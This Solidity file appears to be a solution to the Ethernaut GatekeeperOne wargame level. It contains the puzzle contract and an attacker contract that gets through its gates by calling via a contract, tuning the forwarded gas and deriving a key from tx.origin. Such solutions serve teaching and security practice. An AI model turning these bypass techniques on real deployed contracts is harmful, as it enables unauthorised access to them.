// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract BreakGateKeeperOne {
    uint256 constant baseGasFee = 3000000;
    address public immutable gateKeeperContract;
    GatekeeperOne gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = GatekeeperOne(_gateKeeper);
        gateKeeperContract = _gateKeeper;
    }

    function breakContract(bytes8 _key, uint256 _extraGas) external returns (bool) {
        require(gateKeeper.enter{gas: 8191 * 10 + _extraGas}(_key), "hack failed");
        return true;
    }

    function getKey() external view returns (bytes8) {
        return bytes8(uint64(1 << 63) + uint64(uint16(uint160(tx.origin))));
    }
}
